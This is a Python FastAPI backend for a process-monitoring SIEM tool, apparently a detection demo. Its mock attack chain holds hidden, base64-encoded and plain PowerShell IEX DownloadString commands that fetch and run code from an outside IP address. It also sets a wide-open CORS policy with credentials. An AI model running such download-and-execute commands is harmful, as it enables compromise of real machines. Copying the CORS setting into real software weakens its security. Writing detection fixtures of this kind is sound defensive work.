import sys
import os
import time

# Guarantee project root is in Python module search path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from typing import Dict, List, Set, Tuple

from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, ValidationError

from agent.collector import TelemetryCollector as SystemCollector
from backend.threat_analyzer import ThreatAnalyzer, ProcessModel

app = FastAPI(title="TraceChain SIEM Engine")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

collector = SystemCollector()
analyzer = ThreatAnalyzer()

# Keyed on (pid, create_time) to prevent PID recycling issues
isolated_processes: Set[Tuple[int, str]] = set()

# Latest analysed telemetry per host, filled by /ingest
host_store: Dict[str, Dict] = {}

# Snapshot cache so /scan and /graph-data agree and we don't rescan twice
SNAPSHOT_TTL_SECONDS = 3
_cache = {"t": 0.0, "data": []}


class IngestPayload(BaseModel):
    host_id: str
    processes: List[ProcessModel]


def get_mock_attack_chain() -> List[Dict]:
    return [
        {
            "pid": 1000,
            "ppid": 4,
            "name": "explorer.exe",
            "exe": "C:\\Windows\\explorer.exe",
            "cmdline": ["C:\\Windows\\explorer.exe"],
            "username": "WORKSTATION\\user",
            "create_time_iso": "2026-11-07T12:00:00Z",
            "connections": []
        },
        {
            "pid": 4820,
            "ppid": 1000,
            "name": "WINWORD.EXE",
            "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "cmdline": ["WINWORD.EXE", "C:\\Users\\user\\Downloads\\Invoice_Q3.docm"],
            "username": "WORKSTATION\\user",
            "create_time_iso": "2026-11-07T12:01:00Z",
            "connections": []
        },
        {
            "pid": 5912,
            "ppid": 4820,
            "name": "cmd.exe",
            "exe": "C:\\Windows\\System32\\cmd.exe",
            "cmdline": ["cmd.exe", "/c", "powershell.exe -w hidden -ep bypass -e aWV4KGRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNS8xMzM3Jykp"],
            "username": "WORKSTATION\\user",
            "create_time_iso": "2026-11-07T12:01:05Z",
            "connections": []
        },
        {
            "pid": 6844,
            "ppid": 5912,
            "name": "powershell.exe",
            "exe": "C:\\Users\\user\\AppData\\Local\\Temp\\malicious_payload.exe",
            "cmdline": ["powershell.exe", "-w", "hidden", "-ep", "bypass", "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.5:4444')"],
            "username": "WORKSTATION\\user",
            "create_time_iso": "2026-11-07T12:01:06Z",
            "connections": [{"type": "tcp", "laddr": "192.168.1.50:52110", "raddr": "185.220.101.5:4444", "status": "ESTABLISHED"}]
        }
    ]


def load_processes(simulate: bool = False) -> List[ProcessModel]:
    if simulate:
        raw = get_mock_attack_chain()
    else:
        if time.time() - _cache["t"] > SNAPSHOT_TTL_SECONDS:
            _cache["data"] = collector.capture_system_snapshot()
            _cache["t"] = time.time()
        raw = _cache["data"]

    processes = []
    for p in raw:
        if p.get("pid") in {0, 4}:
            continue
        name = p.get("name") or p.get("process_name") or f"Process_{p.get('pid')}"
        try:
            processes.append(ProcessModel(**{**p, "name": name}))
        except ValidationError:
            continue
    return processes


def run_analysis(simulate: bool = False) -> List[Dict]:
    analysis = analyzer.analyze(load_processes(simulate))
    for r in analysis:
        r["is_isolated"] = (r["pid"], r["create_time"]) in isolated_processes
    return analysis


def status_of(analysis: List[Dict]) -> str:
    live = [r for r in analysis if not r["is_isolated"]]
    if any(r["threat_level"] == "HIGH" for r in live):
        return "CRITICAL"
    if any(r["threat_level"] == "MEDIUM" for r in live):
        return "ELEVATED"
    return "NORMAL"


@app.get("/")
def health_check():
    return {"status": "active", "system": "TraceChain Engine"}


@app.get("/api/v1/scan")
def scan(simulate: bool = Query(False)):
    analysis = run_analysis(simulate)
    return {
        "system_status": status_of(analysis),
        "total_analyzed": len(analysis),
        "results": analysis
    }


@app.post("/api/v1/simulate-threat")
def simulate_threat():
    isolated_processes.clear()
    analysis = run_analysis(simulate=True)
    return {
        "system_status": status_of(analysis),
        "total_analyzed": len(analysis),
        "results": analysis
    }


@app.get("/api/v1/rules")
def get_rules():
    return analyzer.describe_rules()


@app.post("/api/v1/ingest")
def ingest_telemetry(payload: IngestPayload):
    analysis = analyzer.analyze(payload.processes)
    host_store[payload.host_id] = {"updated": time.time(), "results": analysis}
    return {"status": "success", "host_id": payload.host_id, "processed": len(analysis)}


@app.get("/api/v1/graph-data")
def get_graph_data(simulate: bool = Query(False), chain_only: bool = Query(False)):
    analysis = run_analysis(simulate)

    by_pid = {p["pid"]: p for p in analysis}
    keep_pids = set()

    # Keep every non-LOW process and all of its ancestors
    for p in analysis:
        if p["threat_level"] != "LOW":
            curr_pid = p["pid"]
            while curr_pid in by_pid and curr_pid not in keep_pids:
                keep_pids.add(curr_pid)
                curr_pid = by_pid[curr_pid]["ppid"]

    selected = [p for p in analysis if p["pid"] in keep_pids]
    remaining = [p for p in analysis if p["pid"] not in keep_pids]
    if not chain_only:
        selected += remaining[:max(0, 25 - len(selected))]

    selected_pids = {p["pid"] for p in selected}
    nodes = []

    rank = {pid: i for i, pid in enumerate(
        sorted(selected_pids, key=lambda x: by_pid[x].get("create_time") or ""), 1)}

    for proc in selected:
        nodes.append({
            "id": str(proc["pid"]),
            "data": {
                "label": proc["name"],
                "pid": proc["pid"],
                "parent_name": proc["parent_name"],
                "threat_level": proc["threat_level"],
                "risk_score": proc["risk_score"],
                "in_chain": proc["in_chain"],
                "is_isolated": proc["is_isolated"],
                "order": rank[proc["pid"]],
                "full_details": proc
            }
        })

    # Build edges with localized or attack-chain step numbers
    time_map = {proc["pid"]: proc.get("create_time") or "" for proc in selected}
    edges_by_parent: Dict[int, List[Dict]] = {}
    edges = []

    for proc in selected:
        parent = by_pid.get(proc["ppid"]) if proc["ppid"] else None
        if parent and proc["ppid"] in selected_pids:
            edge_obj = {
                "id": f"e-{proc['ppid']}-{proc['pid']}",
                "source": str(proc["ppid"]),
                "target": str(proc["pid"]),
                "data": {"in_chain": bool(proc["in_chain"] and parent["in_chain"])}
            }
            edges.append(edge_obj)
            edges_by_parent.setdefault(proc["ppid"], []).append(edge_obj)

    if chain_only:
        # Suspicious chain mode: global attack timeline (1 -> 2 -> 3)
        edges.sort(key=lambda e: time_map.get(int(e["target"]), ""))
        for idx, e in enumerate(edges, 1):
            e["data"]["step"] = idx
    else:
        # All processes mode: reset numbers per parent node (1, 2, 3 for children of wininit.exe)
        for parent_pid, child_edges in edges_by_parent.items():
            child_edges.sort(key=lambda e: time_map.get(int(e["target"]), ""))
            for idx, e in enumerate(child_edges, 1):
                e["data"]["step"] = idx

    return {"nodes": nodes, "edges": edges}


@app.post("/api/v1/isolate-process/{pid}")
def isolate_process(pid: int, create_time: str = Query("")):
    isolated_processes.add((pid, create_time))
    return {"status": "isolated", "pid": pid}